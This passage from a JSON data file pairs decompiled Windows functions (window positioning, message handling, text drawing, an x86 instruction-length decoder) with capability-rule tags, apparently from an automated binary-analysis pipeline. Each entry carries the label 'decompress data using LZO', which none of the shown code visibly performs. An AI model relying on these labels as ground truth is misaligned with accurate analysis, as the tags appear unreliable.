        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0044b835)\n\nvoid fcn.0044b7d0(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffc4;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x44b8ef;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(*0x492d08 + 0xc) != '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (*(in_EAX + 0x1bc) != 0) {\n            fcn.004600bc();\n            iVar3 = *(in_EAX + 0x1bc);\n            if (iVar3 != 0) {\n                iVar3 = *(iVar3 + -4);\n            }\n            uVar2 = fcn.00405264(0);\n            uVar2 = fcn.00405264(iVar3, uVar2);\n            in_stack_ffffffc4 = 0x400;\n            iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n            puVar1 = puStack28;\n            if (iVar3 != 2) {\n                piVar4 = fcn.0045febc();\n                iVar3 = (**(*piVar4 + 0x14))();\n                puVar1 = puStack28;\n                if (iVar3 != 0) {\n                    in_stack_ffffffc4 = *(**0x492ce0 + 0x3c);\n                    if (*(in_EAX + 0x1b8) != '\\0') {\n                        piVar4 = fcn.0045febc();\n                        iVar3 = (**(*piVar4 + 0x54))();\n                        if (-1 < iVar3) {\n                            piVar4 = fcn.0045febc();\n                            in_stack_ffffffc4 = (**(*piVar4 + 0x18))();\n                        }\n                    }\n                    sub.user32.dll_ActivateKeyboardLayout(in_stack_ffffffc4, 1);\n                    puVar1 = puStack28;\n                }\n            }\n        }\n        puStack28 = puVar1;\n        fcn.0044d1c8();\n        fcn.0045283c();\n        puVar1 = puStack28;\n    }\n    puStack28 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffc4;\n    fcn.00404da0(0x44b8f6);\n    return;\n}\n",
        "token_count": 639
    },
    "0044b900": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0044b961)\n\nvoid fcn.0044b900(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffbc;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x44b9cf;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    puVar1 = &stack0xfffffffc;\n    if (*(*0x492d08 + 0xc) != '\\0') {\n        puVar1 = &stack0xfffffffc;\n        if (*(in_EAX + 0x1bc) != 0) {\n            fcn.004600bc();\n            iVar3 = *(in_EAX + 0x1bc);\n            if (iVar3 != 0) {\n                iVar3 = *(iVar3 + -4);\n            }\n            uVar2 = fcn.00405264(0);\n            uVar2 = fcn.00405264(iVar3, uVar2);\n            iVar3 = sub.kernel32.dll_CompareStringA_1(0x400, 1, uVar2);\n            puVar1 = puStack28;\n            if (iVar3 != 2) {\n                in_stack_ffffffbc = *(**0x492ce0 + 0x3c);\n                sub.user32.dll_ActivateKeyboardLayout(in_stack_ffffffbc, 1);\n                puVar1 = puStack28;\n            }\n        }\n        puStack28 = puVar1;\n        puVar1 = puStack28;\n        if (*(in_EAX + 0x1b8) == '\\0') {\n            fcn.0044d1c8();\n            fcn.00452820();\n            puVar1 = puStack28;\n        }\n    }\n    puStack28 = puVar1;\n    *in_FS_OFFSET = in_stack_ffffffbc;\n    fcn.00404da0(0x44b9d6);\n    return;\n}\n",
        "token_count": 496
    },
    "0044ec54": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044ec54(int32_t param_1, int32_t *param_2)\n\n{\n    bool bVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    var_18h = *param_2;\n    var_14h = param_2[1];\n    iVar4 = param_2[3];\n    *(in_EAX + 0x96) = 1;\n    uStack56 = 0x44ee38;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack60;\n    var_4h = in_EAX;\n    fcn.004455dc();\n    fcn.00446918();\n    iVar2 = fcn.0045fc24();\n    if (iVar2 < var_4h[0x13] + var_14h) {\n        var_14h = fcn.0045fc24();\n        var_14h = var_14h - var_4h[0x13];\n    }\n    iVar2 = fcn.0045fc30();\n    if (iVar2 < var_4h[0x12] + var_18h) {\n        var_18h = fcn.0045fc30();\n        var_18h = var_18h - var_4h[0x12];\n    }\n    iVar2 = fcn.0045fc18();\n    if (var_18h < iVar2) {\n        var_18h = fcn.0045fc18();\n    }\n    iVar2 = fcn.0045fc0c();\n    if (iVar4 + 4 < iVar2) {\n        fcn.0045fc0c();\n    }\n    uVar3 = fcn.0044d1c8(0xffffffff, var_18h, var_14h, var_4h[0x12], var_4h[0x13], 0x10);\n    sub.user32.dll_SetWindowPos(uVar3);\n    iVar4 = sub.kernel32.dll_GetTickCount();\n    if (iVar4 - var_4h[0x97] < 0xfb) {\n        bVar1 = false;\n    }\n    else {\n        if (param_1 != 0) {\n            param_1 = *(param_1 + -4);\n        }\n        bVar1 = param_1 < 100;\n    }\n    if ((bVar1) && (*0x4915d8 != NULL)) {\n        sub.user32.dll_SystemParametersInfoA(0x1016, 0, &var_8h, 0);\n        if (var_8h != 0) {\n            sub.user32.dll_SystemParametersInfoA(0x1018, 0, &var_8h, 0);\n            if (var_8h == 0) {\n                fcn.00452458();\n                if (var_14h < var_1ch) {\n                    iVar4 = 0;\n                }\n                else {\n                    iVar4 = 1;\n                }\n            }\n            else {\n                iVar4 = 2;\n            }\n            uVar3 = fcn.0044d1c8(100, *(iVar4 * 4 + 0x4916e0) | 0x40000);\n            (**0x4915d8)(uVar3);\n        }\n    }\n    fcn.0044a0d8();\n    uVar3 = fcn.0044d1c8(4);\n    sub.user32.dll_ShowWindow();\n    (**(*var_4h + 0x80))();\n    *in_FS_OFFSET = uVar3;\n    iVar4 = sub.kernel32.dll_GetTickCount(0x44ee3f);\n    var_4h[0x97] = iVar4;\n    *(var_4h + 0x96) = 0;\n    return;\n}\n",
        "token_count": 952
    },
    "00451298": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00451298(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x4512aa;\n    fcn.00405254();\n    uStack24 = 0x451307;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (in_EAX != 0) {\n        in_EAX = *(in_EAX + -4);\n    }\n    puStack20 = &stack0xfffffffc;\n    (**(**(arg_8h + -4) + 0x10))();\n    if (0 < in_EAX) {\n        (**(**(arg_8h + -4) + 0x10))();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x45130e;\n    uStack24 = 0x451306;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 255
    },
    "00458938": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00458938(uint param_1, int32_t param_2)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x1f) == '\\0') || (3 < *(param_2 + 4))) {\n    // switch table (8 cases) at 0x458b2a\n        switch(*(param_2 + 4)) {\n        case 0:\n            fcn.00458cc8();\n            break;\n        case 1:\n            fcn.00458cc8();\n            break;\n        case 2:\n            fcn.00458840();\n            fcn.00458cc8();\n            break;\n        case 3:\n            fcn.00458840();\n            fcn.00458cc8();\n            break;\n        case 4:\n            if (*(in_EAX + 0x14) < 0x8000) {\n                fcn.00458cc8();\n            }\n            else {\n                fcn.004588d8(&stack0xfffffffc);\n                fcn.00458cc8();\n            }\n            break;\n        case 5:\n            if (*(in_EAX + 0x1d) != '\\0') {\n                if (*(in_EAX + 0x14) < 0x8000) {\n                    fcn.00458cc8();\n                }\n                else {\n                    fcn.004588d8(&stack0xfffffffc);\n                    fcn.00458cc8();\n                }\n            }\n            break;\n        case 6:\n            fcn.00458cc8();\n            break;\n        case 7:\n            fcn.00458cc8();\n        }\n    }\n    else {\n        if (*(param_2 + 4) < 2) {\n            iVar4 = *(in_EAX + 0x40);\n            var_10h = *(in_EAX + 8) % iVar4;\n        }\n        else if (*(param_2 + 4) - 2 < 2) {\n            iVar4 = *(in_EAX + 0x3c);\n            var_10h = *(in_EAX + 10) % iVar4;\n        }\n        else {\n            iVar4 = 0;\n            var_10h = 0;\n        }\n        var_14h = 0;\n        for (; 0 < iVar4; iVar4 = iVar4 + -1) {\n            iVar3 = sub.kernel32.dll_GetTickCount();\n            uVar2 = *(in_EAX + 0x20);\n            if (uVar2 < 0) {\n                if (0 < uVar2 >> 0x1f) goto code_r0x00458a06;\n            }\n            else if (iVar3 - var_14h < uVar2) {\ncode_r0x00458a06:\n                sub.kernel32.dll_Sleep_2(*(in_EAX + 0x20) - (iVar3 - var_14h));\n            }\n            iVar1 = *(param_2 + 4);\n            if (iVar1 == 0) {\n                fcn.00458cc8();\n            }\n            else if (iVar1 == 1) {\n                fcn.00458cc8();\n            }\n            else if (iVar1 == 2) {\n                fcn.00458cc8();\n            }\n            else if (iVar1 == 3) {\n                fcn.00458cc8();\n            }\n            (**(**(in_EAX + 4) + 0x8c))();\n            var_14h = iVar3;\n        }\n        if (0 < var_10h) {\n            iVar1 = *(param_2 + 4);\n            if (iVar1 == 0) {\n                fcn.00458cc8();\n            }\n            else if (iVar1 == 1) {\n                fcn.00458cc8();\n            }\n            else if (iVar1 == 2) {\n                fcn.00458cc8();\n            }\n            else if (iVar1 == 3) {\n                fcn.00458cc8();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 953
    },
    "0045f50c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0045f555)\n// WARNING: Removing unreachable block (ram,0x0045f575)\n// WARNING: Removing unreachable block (ram,0x0045f57e)\n// WARNING: Removing unreachable block (ram,0x0045f583)\n// WARNING: Removing unreachable block (ram,0x0045f590)\n// WARNING: Removing unreachable block (ram,0x0045f595)\n// WARNING: Removing unreachable block (ram,0x0045f5a2)\n\nvoid fcn.0045f50c(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x45f5ec;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    iVar1 = fcn.0044bb7c();\n    if (iVar1 == 1) {\n        fcn.0044551c();\n        fcn.00404e90();\n        fcn.00405264();\n        fcn.0044552c();\n        fcn.004455dc();\n    }\n    fcn.0044b9e0();\n    fcn.004448f8();\n    if ((*(in_EAX + 0x1c) & 1) == 0) {\n        fcn.0045a7f4();\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x45f5f3;\n    uStack32 = 0x45f5eb;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 409
    },
    "0045f7ac": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0045f810)\n// WARNING: Removing unreachable block (ram,0x0045f830)\n// WARNING: Removing unreachable block (ram,0x0045f839)\n// WARNING: Removing unreachable block (ram,0x0045f83e)\n// WARNING: Removing unreachable block (ram,0x0045f84b)\n// WARNING: Removing unreachable block (ram,0x0045f850)\n// WARNING: Removing unreachable block (ram,0x0045f85d)\n\nvoid __fastcall fcn.0045f7ac(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x45f881;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    (**(*in_EAX + -0x10))();\n    if (**(param_2 + 8) == 0xc) {\n        fcn.0044551c();\n        fcn.00404e90();\n        fcn.00405264();\n        fcn.0044552c();\n        fcn.004455dc();\n    }\n    else if (**(param_2 + 8) == 0xb00b) {\n        fcn.0045a7f4();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x45f888;\n    uStack28 = 0x45f880;\n    fcn.00404da0();\n    return;\n}\n",
        "token_count": 384
    },
    "004616b0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004616b0(uint param_1, int32_t *param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t in_EAX;\n    code **ppcVar3;\n    code *pcVar4;\n    uint32_t uVar5;\n    uint uVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x461d7a;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    param_2[3] = 0;\n    iVar8 = *(*(in_EAX + 0xb0) + 8);\n    puVar1 = &stack0xfffffffc;\n    if (-1 < iVar8 + -1) {\n        do {\n            puStack28 = puVar1;\n            ppcVar3 = fcn.00414eec();\n            cVar2 = (**ppcVar3)();\n            if (cVar2 != '\\0') {\n                *in_FS_OFFSET = uStack36;\n                return;\n            }\n            iVar8 = iVar8 + -1;\n            puVar1 = puStack28;\n        } while (iVar8 != 0);\n    }\n    fcn.00461564();\n    iVar8 = *param_2;\n    if (0x53 < iVar8) {\n        if (iVar8 < 0xb018) {\n            if (iVar8 == 0xb017) {\n                if ((*(in_EAX + 0x44) != 0) && (iVar8 = fcn.0044d1c8(),  iVar8 != 0)) {\n                    uVar6 = fcn.0044d1c8();\n                    iVar8 = sub.user32.dll_IsWindowEnabled(uVar6);\n                    if (iVar8 != 0) {\n                        uVar6 = fcn.0044d1c8();\n                        iVar8 = sub.user32.dll_IsWindowVisible(uVar6);\n                        if (iVar8 != 0) {\n                            *0x49173c = 0;\n                            uVar6 = sub.user32.dll_GetFocus();\n                            uVar7 = fcn.0044d1c8();\n                            sub.user32.dll_SetFocus(uVar7);\n                            fcn.00446870(param_2[2]);\n                            sub.user32.dll_SetFocus(uVar6);\n                            *0x49173c = 1;\n                            param_2[3] = 1;\n                        }\n                    }\n                }\n                goto code_r0x00461d70;\n            }\n            if (iVar8 < 0xb001) {\n                if (iVar8 == 0xb000) {\n                    if (*(in_EAX + 0x13a) != 0) {\n                        (**(in_EAX + 0x138))();\n                    }\n                    goto code_r0x00461d70;\n                }\n                if (iVar8 == 0x112) {\n                    if ((param_2[1] & 0xfff0U) == 0xf020) {\n                        fcn.00461de0();\n                    }\n                    else if ((param_2[1] & 0xfff0U) == 0xf120) {\n                        fcn.00461ea4();\n                    }\n                    else {\n                        fcn.00461628(&stack0xfffffffc);\n                    }\n                    goto code_r0x00461d70;\n                }\n                if (iVar8 - 0x132U < 7) {\n                    iVar8 = sub.user32.dll_SendMessageA(param_2[2], iVar8 + 0xbc00, param_2[1], param_2[2]);\n                    param_2[3] = iVar8;\n                    goto code_r0x00461d70;\n                }\n                if (iVar8 - 0x132U == 0x1e8) {\n                    fcn.00437d14();\n                    fcn.00437e78();\n                    goto code_r0x00461d70;\n                }\n            }\n            else {\n                if (iVar8 == 0xb001) {\n                    if (*(in_EAX + 0x132) != 0) {\n                        (**(in_EAX + 0x130))();\n                    }\n                    goto code_r0x00461d70;\n                }\n                if (iVar8 == 0xb016) {\n                    cVar2 = fcn.004621f8();\n                    if (cVar2 != '\\0') {\n                        param_2[3] = 1;\n                    }\n                    goto code_r0x00461d70;\n                }\n            }\n        }\n        else if (iVar8 < 0xb021) {\n            if (iVar8 == 0xb020) {\n                if (param_2[1] == 0) {\n                    fcn.00462438(*param_2[2], param_2[2][1]);\n                }\n                else {\n                    fcn.00462494(*param_2[2], param_2[2][1]);\n                }\n                goto code_r0x00461d70;\n            }\n            if (iVar8 == 0xb01a) {\n                iVar8 = sub.user32.dll_IsIconic(*(in_EAX + 0x30));\n                if (((iVar8 == 0) && (iVar8 = sub.user32.dll_GetFocus(),  iVar8 == *(in_EAX + 0x30))) &&\n                   (iVar8 = fcn.00458164(),  iVar8 != 0)) {\n                    sub.user32.dll_SetFocus(iVar8);\n                }\n                goto code_r0x00461d70;\n            }\n            if (iVar8 == 0xb01f) goto code_r0x00461c9d;\n        }\n        else {\n            if (iVar8 == 0xb031) {\n                if (param_2[1] == 1) {\n                    param_2[3] = *(in_EAX + 0xb8);\n                }\n                else {\n                    *(in_EAX + 0xb8) = param_2[2];\n                }\n                goto code_r0x00461d70;\n            }\n            if (iVar8 - 0xb03fU < 2) {\n                uVar5 = fcn.00463bd8();\n                param_2[3] = uVar5 & 0x7f;\n                goto code_r0x00461d70;\n            }\n        }\n        goto code_r0x00461d69;\n    }\n    if (iVar8 == 0x53) {\ncode_r0x00461c9d:\n        fcn.004629e8();\n        goto code_r0x00461d70;\n    }\n    if (iVar8 < 0x15) {\n    // switch table (18 cases) at 0x461754\n        switch(iVar8) {\n        case 0:\n            fcn.0041b334();\n            break;\n        case 1:\n        case 2:\n        case 3:\n        case 4:\n        case 5:\n        case 6:\n        case 8:\n        case 9:\n        case 0xb:\n        case 0xc:\n        case 0xd:\n        case 0xe:\n            goto code_r0x00461d69;\n        case 7:\n            sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb01a, 0, 0);\n            fcn.00461628(&stack0xfffffffc);\n            break;\n        case 10:\n            if (param_2[1] == 0) {\n                fcn.00461628(&stack0xfffffffc);\n                if ((*(in_EAX + 0xb4) == 0) && (*0x491750 == '\\0')) {\n                    uVar6 = fcn.00458004();\n                    *(in_EAX + 0xb4) = uVar6;\n                }\n                fcn.00461338();\n            }\n            else {\n                if ((*0x491750 == '\\0') && (fcn.00461390(),  *(in_EAX + 0xb4) != 0)) {\n                    fcn.004580c8();\n                    *(in_EAX + 0xb4) = 0;\n                }\n                fcn.00461628(&stack0xfffffffc);\n            }\n            break;\n        case 0xf:\n            iVar8 = sub.user32.dll_IsIconic(*(in_EAX + 0x30));\n            if (iVar8 == 0) {\n                fcn.00461628(&stack0xfffffffc);\n            }\n            else {\n                fcn.00461664(&stack0xfffffffc);\n            }\n            break;\n        case 0x10:\n            if (*(in_EAX + 0x44) != 0) {\n                fcn.0045e8a8();\n            }\n            break;\n        case 0x11:\n            param_2[3] = 1;\n            break;\n        default:\n            *param_2 = 0x27;\n            fcn.00461628(&stack0xfffffffc);\n        }\n    }\n    else {\n        if (iVar8 < 0x1e) {\n            if (iVar8 == 0x1d) {\n                fcn.00460888();\n                fcn.00461628(&stack0xfffffffc);\n                goto code_r0x00461d70;\n            }\n            if (iVar8 == 0x16) {\n                if (param_2[1] != 0) {\n                    fcn.0040dc3c();\n                    fcn.00404cac();\n                }\n                goto code_r0x00461d70;\n            }\n            if (iVar8 == 0x1a) {\n                fcn.00452554();\n                fcn.004615bc();\n                fcn.00461628(&stack0xfffffffc);\n                goto code_r0x00461d70;\n            }\n            if (iVar8 == 0x1c) {\n                fcn.00461628(&stack0xfffffffc);\n                *(in_EAX + 0xa5) = '\\x01' - (param_2[1] == 0);\n                if (param_2[1] == 0) {\n                    fcn.00461330();\n                    sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb001, 0, 0);\n                }\n                else {\n                    fcn.00461390();\n                    sub.user32.dll_PostMessageA(*(in_EAX + 0x30), 0xb000, 0, 0);\n                }\n                goto code_r0x00461d70;\n            }\n        }\n        else {\n            if (iVar8 == 0x37) {\n                iVar8 = fcn.00461dc4();\n                param_2[3] = iVar8;\n                goto code_r0x00461d70;\n            }\n            if (iVar8 == 0x4a) {\n                if ((*param_2[2] == -0x21acbbac) && (*(in_EAX + 0xa6) != '\\0')) {\n                    if (*(in_EAX + 0xa8) == 0) {\n                        iVar8 = fcn.0040e1e4();\n                        *(in_EAX + 0xa8) = iVar8;\n                        if (iVar8 == 0) {\n                            iVar8 = sub.kernel32.dll_GetLastError_1();\n                            param_2[3] = iVar8;\n                            *(in_EAX + 0xa8) = 0;\n                        }\n                        else {\n                            param_2[3] = 0;\n                            pcVar4 = sub.kernel32.dll_GetProcAddress_1(*(in_EAX + 0xa8), 0x461db0);\n                            if (pcVar4 != NULL) {\n                                (*pcVar4)(*(param_2[2] + 4), *(param_2[2] + 8));\n                            }\n                        }\n                    }\n                    else {\n                        param_2[3] = 0;\n                    }\n                }\n                goto code_r0x00461d70;\n            }\n        }\ncode_r0x00461d69:\n        fcn.00461628(&stack0xfffffffc);\n    }\ncode_r0x00461d70:\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 2721
    },
    "004625a8": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004625a8(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    *(in_EAX + 0xad) = 1;\n    uStack28 = 0x462686;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x4625d4;\n    fcn.0040888c();\n    if (*(in_EAX + 0x44) != 0) {\n        if (**0x492b14 == 3) {\n            puStack36 = 0x462604;\n            fcn.0045c000();\n        }\n        else if (**0x492b14 == 7) {\n            *(*(in_EAX + 0x44) + 0x273) = 1;\n        }\n        if (*(in_EAX + 0x5b) != '\\0') {\n            if (*(*(in_EAX + 0x44) + 0x273) == '\\x01') {\n                puStack36 = 0x462624;\n                fcn.00461de0();\n            }\n            else {\n                puStack36 = 0x46262d;\n                fcn.0045a7f4();\n            }\n        }\n        do {\n            uStack40 = 0x46264d;\n            uStack44 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffd4;\n            puStack36 = &stack0xfffffffc;\n            fcn.00462414();\n            *in_FS_OFFSET = uStack44;\n        } while (*(in_EAX + 0xa4) == '\\0');\n    }\n    *in_FS_OFFSET = uStack32;\n    *(in_EAX + 0xad) = 0;\n    return;\n}\n",
        "token_count": 453
    },
    "00463e1c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t fcn.00463e1c(void)\n\n{\n    uint8_t uVar1;\n    uint uVar2;\n    bool bVar3;\n    bool bVar4;\n    uint8_t *in_EAX;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint16_t uVar7;\n    uint8_t uVar8;\n    uint16_t uVar9;\n    uint *in_FS_OFFSET;\n    uchar auStack48 [12];\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    uVar2 = *in_FS_OFFSET;\n    *in_FS_OFFSET = auStack48;\n    puVar6 = in_EAX;\n    if (in_EAX != NULL) {\n        bVar4 = false;\n        bVar3 = false;\n        var_8h = 4;\n        var_14h = 0;\n        do {\n            puVar5 = puVar6;\n            uVar1 = *puVar5;\n            uVar9 = uVar1;\n            puVar6 = puVar5 + 1;\n            if (uVar1 == 0x66) {\n                var_8h = 2;\n            }\n            else if (uVar1 == 0x67) {\n                bVar4 = true;\n            }\n            else if (((uVar1 & 0xe7) != 0x26) && (1 < uVar1 - 100)) {\n                bVar3 = true;\n            }\n        } while (!bVar3);\n        if (uVar1 == 0xf) {\n            uVar7 = *(*puVar6 * 2 + 0x491a68);\n            uVar9 = *puVar6 + 0xf00;\n            puVar6 = puVar5 + 2;\n        }\n        else {\n            uVar7 = *(uVar1 * 2 + 0x491868);\n        }\n        if ((uVar7 & 0x38) != 0) {\n            uVar1 = *puVar6;\n            uVar8 = uVar1 & 7;\n            puVar6 = puVar6 + 1;\n            if ((uVar1 & 0xc0) == 0x40) {\n                var_10h = 1;\n            }\n            else if ((uVar1 & 0xc0) == 0x80) {\n                if (bVar4) {\n                    var_10h = 2;\n                }\n                else {\n                    var_10h = 4;\n                }\n            }\n            else {\n                var_10h = 0;\n            }\n            if (!((uVar1 & 0xc0) != 0xc0 & bVar4)) {\n                if ((uVar8 == 4) && ((uVar1 & 0xc0) != 0xc0)) {\n                    uVar8 = *puVar6 & 7;\n                }\n                if (((uVar1 & 0xc0) == 0) && (uVar8 == 5)) {\n                    var_10h = 4;\n                }\n                puVar6 = puVar6 + var_10h;\n            }\n            if ((uVar7 & 0x38) == 8) {\n    // switch table (32 cases) at 0x46402a\n                switch(uVar9) {\n                case 0xd8:\n                    var_14h = 2;\n                    break;\n                case 0xd9:\n                    var_14h = 3;\n                    break;\n                case 0xda:\n                    var_14h = 4;\n                    break;\n                case 0xdb:\n                    var_14h = 5;\n                    break;\n                case 0xdc:\n                    var_14h = 6;\n                    break;\n                case 0xdd:\n                    var_14h = 7;\n                    break;\n                case 0xde:\n                    var_14h = 8;\n                    break;\n                case 0xdf:\n                    var_14h = 9;\n                    break;\n                case 0xf6:\n                    var_14h = 0;\n                    break;\n                case 0xf7:\n                    var_14h = 1;\n                }\n                if ((uVar1 & 0xc0) == 0xc0) {\n                    uVar7 = *(var_14h * 0x20 + 0x491c78 + (uVar1 >> 3 & 7) * 2);\n                }\n                else {\n                    uVar7 = *(var_14h * 0x20 + 0x491c68 + (uVar1 >> 3 & 7) * 2);\n                }\n            }\n        }\n        uVar7 = uVar7 & 0xc00;\n        if (uVar7 == 0x400) {\n            puVar6 = puVar6 + 1;\n        }\n        else if (uVar7 == 0x800) {\n            puVar6 = puVar6 + 2;\n        }\n        else if (uVar7 == 0xc00) {\n            puVar6 = puVar6 + var_8h;\n        }\n        else {\n            if (uVar9 != 0x9a) {\n                if (uVar9 - 0xa0 < 4) {\n                    if (bVar4) {\n                        puVar6 = puVar6 + 2;\n                    }\n                    else {\n                        puVar6 = puVar6 + 4;\n                    }\n                    goto code_r0x0046418e;\n                }\n                if (uVar9 == 200) {\n                    puVar6 = puVar6 + 3;\n                    goto code_r0x0046418e;\n                }\n                if (uVar9 != 0xea) goto code_r0x0046418e;\n            }\n            puVar6 = puVar6 + var_8h + 2;\n        }\n    }\ncode_r0x0046418e:\n    *in_FS_OFFSET = uVar2;\n    return puVar6 - in_EAX;\n}\n",
        "token_count": 1349
    },
    "00466048": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00466048(uint32_t arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    uint lprc;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    lprc = *arg_10h;\n    uStack16 = arg_10h[1];\n    uStack12 = arg_10h[2];\n    uStack8 = arg_10h[3];\n    fcn.004215f0();\n    if (arg_ch == '\\x01') {\n        sub.user32.dll_OffsetRect(&lprc, 1, 1);\n        fcn.00420c18();\n        iVar2 = in_ECX;\n        if (in_ECX != 0) {\n            iVar2 = *(in_ECX + -4);\n        }\n        uVar1 = fcn.00405264(iVar2, &lprc, arg_8h | 5);\n        uVar1 = fcn.00421c8c(uVar1);\n        sub.user32.dll_DrawTextA(uVar1);\n        sub.user32.dll_OffsetRect(&lprc, 0xffffffff, 0xffffffff);\n        fcn.00420c18();\n        if (in_ECX != 0) {\n            in_ECX = *(in_ECX + -4);\n        }\n        uVar1 = fcn.00405264(in_ECX, &lprc, arg_8h | 5);\n        uVar1 = fcn.00421c8c(uVar1);\n        sub.user32.dll_DrawTextA(uVar1);\n    }\n    else {\n        if (in_ECX != 0) {\n            in_ECX = *(in_ECX + -4);\n        }\n        uVar1 = fcn.00405264(in_ECX, &lprc, arg_8h | 5);\n        uVar1 = fcn.00421c8c(uVar1);\n        sub.user32.dll_DrawTextA(uVar1);\n    }\n    return;\n}\n",
        "token_count": 466
    },
    "00466138": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
